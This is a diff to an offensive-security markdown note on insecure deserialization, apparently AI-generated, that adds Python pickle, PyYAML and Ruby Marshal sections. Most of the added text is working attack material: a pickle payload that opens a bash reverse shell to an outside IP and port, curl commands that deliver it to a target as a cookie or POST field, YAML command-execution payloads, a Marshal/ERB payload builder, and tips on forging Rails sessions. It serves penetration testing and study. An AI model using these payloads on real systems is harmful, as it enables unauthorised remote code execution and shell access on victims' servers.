@@ -2,11 +2,9 @@
 
 #Deserialization #RCE #Java #PHP #WebAppAttacks
 
-
 ## What is this?
 
-Insecure deserialization enables object injection, property manipulation, or RCE via gadget chains when untrusted data is deserialized without validation. Covers Java, PHP, Python, and .NET. Pairs with [[Web Attacks]], [[Server-Side Attacks]].
-
+Insecure deserialization enables object injection, property manipulation, or RCE via gadget chains when untrusted data is deserialized without validation. Covers Java, PHP, Python, Ruby, and .NET. Pairs with [[Web Attacks]], [[Server-Side Attacks]], [[Non-PHP Web App Attacks]].
 
 ---
 
@@ -325,6 +323,90 @@ print(base64.b64encode(json.dumps(payload).encode()).decode())
 
 ---
 
+## Python Deserialization
+
+### Pickle
+
+`pickle.loads()` on untrusted data executes arbitrary code via `__reduce__`. Detection: base64 blob in cookie/POST parameter, error messages referencing `pickle`.
+
+```python
+# Generate RCE payload
+import pickle, os, base64
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"',))
+
+payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+print(payload)
+```
+
+```bash
+# Send as cookie or POST parameter
+curl http://target.com/ --cookie "data=<base64_payload>"
+curl -X POST http://target.com/api -d "session=<base64_payload>"
+```
+
+> [!note] `subprocess` gives more control over args than `os.system` — use `(subprocess.check_output, (['bash', '-c', 'cmd'],))` if the payload needs to avoid shell escaping issues.
+
+### YAML (PyYAML)
+
+`yaml.load()` without `Loader=yaml.SafeLoader` executes `!!python/object/apply` constructors.
+
+```bash
+# RCE payload
+!!python/object/apply:os.system ["id"]
+
+# Subprocess (avoids shell quoting)
+!!python/object/apply:subprocess.check_output [["id"]]
+```
+
+See [[Non-PHP Web App Attacks]] for full YAML deser coverage.
+
+---
+
+## Ruby Deserialization
+
+### Marshal
+
+`Marshal.load` on untrusted data executes gadget chains. Rails < 4.0 used Marshal by default for session cookies. Detection: binary blob in cookie that isn't JSON or base64-JWT.
+
+```bash
+# Check cookie type
+echo "<cookie_value>" | base64 -d | file -
+# "data" → potentially Marshal, not JSON
+
+# Detect: \x04\x08 are the Marshal magic bytes (0x04 0x08)
+echo "<cookie_value>" | base64 -d | xxd | head -1
+```
+
+```ruby
+# Generate RCE payload (simplified — real exploit requires gadget chain)
+# Use universal-deserialisation-gadget or ysoserial-ruby
+
+# ERB as payload (evaluates Ruby code via template)
+require 'base64'
+require 'erb'
+
+erb_payload = ERB.new("<%= `id` %>")
+payload = Marshal.dump(erb_payload)
+puts Base64.strict_encode64(payload)
+```
+
+```bash
+# Tools
+# https://github.com/freneticarray/universal-deserialisation-gadget
+# For modern Rails: use Rack::Session cookie forging if SECRET_KEY_BASE known
+
+# SECRET_KEY_BASE → forge session cookie
+# Install rails-cookie-manager or use python-rails-session-decoder
+gem install rails_secret_key_base_logger   # or use existing rails console if you have shell
+```
+
+> [!note] Modern Rails (4+) uses JSON-serialized, HMAC-signed cookies. Marshal deser is primarily a concern on legacy Rails 3.x or apps that explicitly use `Marshal.load`. If you have `SECRET_KEY_BASE`, forge the session directly rather than trying to craft Marshal payloads. See [[Non-PHP Web App Attacks]].
+
+---
+
 ## Detection Tools
 
 ```bash
@@ -370,5 +452,5 @@ curl -s -X POST "http://<target>/api" --data-binary @ping.ser
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
